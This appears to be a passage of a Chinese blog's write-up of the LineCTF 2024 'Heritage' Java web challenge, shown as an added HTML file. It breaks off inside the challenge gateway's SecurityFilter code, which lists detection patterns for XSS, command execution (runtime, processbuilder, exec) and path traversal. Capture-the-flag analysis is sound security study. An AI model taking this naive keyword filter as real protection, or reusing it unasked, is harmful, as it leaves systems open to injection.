@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='写文章写烦了，心血来潮跟着队里打了一下今年的 LineCTF，做了一道Java Web 题，现在把思考过程记录一下 别问为啥就一道题解，咳咳，做一道题是'>
+<title>2024LineCTF Heritage题解</title>
+
+<link rel='canonical' href='/p/2024linectfheritage%E9%A2%98%E8%A7%A3/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='2024LineCTF Heritage题解'>
+<meta property='og:description' content='写文章写烦了，心血来潮跟着队里打了一下今年的 LineCTF，做了一道Java Web 题，现在把思考过程记录一下 别问为啥就一道题解，咳咳，做一道题是'>
+<meta property='og:url' content='/p/2024linectfheritage%E9%A2%98%E8%A7%A3/'>
+<meta property='og:site_name' content='0ZHan&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2024-03-26T00:08:24&#43;08:00'/><meta property='article:modified_time' content='2024-03-26T00:08:24&#43;08:00'/>
+<meta name="twitter:title" content="2024LineCTF Heritage题解">
+<meta name="twitter:description" content="写文章写烦了，心血来潮跟着队里打了一下今年的 LineCTF，做了一道Java Web 题，现在把思考过程记录一下 别问为啥就一道题解，咳咳，做一道题是">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G42YH9J7M8"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-G42YH9J7M8', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/1000_huac81c2698ed7f4f7ac0962c570fafca4_51159_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">0ZHan&#39;s Blog</a></h1>
+            <h2 class="site-description">才须学也</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href=''
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href=''
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/tags/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+                
+                <span>标签</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2024linectfheritage%E9%A2%98%E8%A7%A3/">2024LineCTF Heritage题解</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 26, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>写文章写烦了，心血来潮跟着队里打了一下今年的 <code>LineCTF</code>，做了一道<code>Java Web</code> 题，现在把思考过程记录一下</p>
+<blockquote>
+<p>别问为啥就一道题解，咳咳，做一道题是放松，做一堆题是坐牢，劳逸结合嘛~</p>
+</blockquote>
+<p>这道题给了两个 <code>Jar</code> 包：<code>Heritage-app.jar</code> 和 <code>Heritage-gw.jar</code></p>
+<p><strong>Heritage-gw.jar</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#61afef">@Component</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">SecurityFilter</span> <span style="color:#c678dd">implements</span> <span style="color:#e06c75">GlobalFilter</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">final</span> <span style="color:#e06c75">Logger</span> <span style="color:#e06c75">log</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">LoggerFactory</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getLogger</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">SecurityFilter</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">final</span> <span style="color:#e06c75">List</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">ATTACK_PATTERNS</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Arrays</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">asList</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;&lt;script&gt;(.*?)&lt;/script&gt;&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;src[\r\n]*=[\r\n]*\\&#39;(.*?)\\&#39;&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;&lt;/script&gt;&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;&lt;script(.*?)&gt;&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;eval\\((.*?)\\)&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;expression\\((.*?)\\)&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;javascript:&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;vbscript:&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;onload(.*?)=&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;include\\s+(.*?)&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;require\\s+(.*?)&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">42</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;support&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;runtime&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;processbuilder&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;scriptenginemanager&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;eval&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;exec&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;yaml&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;tostring&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;character&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;substr&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;getmethods&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;invoke&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;\\.\\./&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;\\.\\.\\\\&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;%2e&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;%2f&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">),</span> <span style="color:#e06c75">Pattern</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">compile</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;/[^/]*/internal/&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">));</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#61afef;font-weight:bold">SecurityFilter</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#e06c75">Mono</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Void</span><span style="color:#56b6c2">&gt;</span> <span style="color:#61afef;font-weight:bold">filter</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ServerWebExchange</span> <span style="color:#e06c75">exchange</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">GatewayFilterChain</span> <span style="color:#e06c75">chain</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ServerHttpRequest</span> <span style="color:#e06c75">request</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">exchange</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getRequest</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">queryParams</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">request</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getURI</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">toString</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">queryParams</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isAttackString</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">queryParams</span><span style="color:#56b6c2">))</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ServerHttpResponse</span> <span style="color:#e06c75">response</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">exchange</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getResponse</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">response</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setStatusCode</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">HttpStatus</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">BAD_REQUEST</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">DataBuffer</span> <span style="color:#e06c75">buffer</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">response</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">bufferFactory</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">wrap</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;Invalid request&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getBytes</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">StandardCharsets</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">UTF_8</span><span style="color:#56b6c2">));</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">response</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeWith</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Flux</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">just</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">buffer</span><span style="color:#56b6c2">));</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#98c379">&#34;POST&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equalsIgnoreCase</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">request</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getMethodValue</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">request</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getHeaders</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">getContentType</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">request</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getHeaders</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">getContentType</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">includes</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">MediaType</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">APPLICATION_JSON</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">?</span> <span style="color:#e06c75">DataBufferUtils</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">join</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">request</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getBody</span><span style="color:#56b6c2">()).</span><span style="color:#e06c75">flatMap</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">dataBuffer</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">-&gt;</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">dataBuffer</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readableByteCount</span><span style="color:#56b6c2">()];</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dataBuffer</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">DataBufferUtils</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">release</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">dataBuffer</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">String</span> <span style="color:#e06c75">requestBody</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#c678dd">new</span> <span style="color:#e06c75">String</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">StandardCharsets</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">UTF_8</span><span style="color:#56b6c2">)).</span><span style="color:#e06c75">toLowerCase</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isAttackString</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">requestBody</span><span style="color:#56b6c2">))</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">exchange</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getResponse</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">setStatusCode</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">HttpStatus</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">BAD_REQUEST</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">return</span> <span style="color:#e06c75">exchange</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getResponse</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">setComplete</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">final</span> <span style="color:#e06c75">DataBuffer</span> <span style="color:#e06c75">buffer</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">exchange</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getResponse</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">bufferFactory</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">wrap</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">ServerHttpRequest</span> <span style="color:#e06c75">mutatedRequest</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ServerHttpRequestDecorator</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">request</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#c678dd">public</span> <span style="color:#e06c75">Flux</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">DataBuffer</span><span style="color:#56b6c2">&gt;</span> <span style="color:#61afef;font-weight:bold">getBody</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
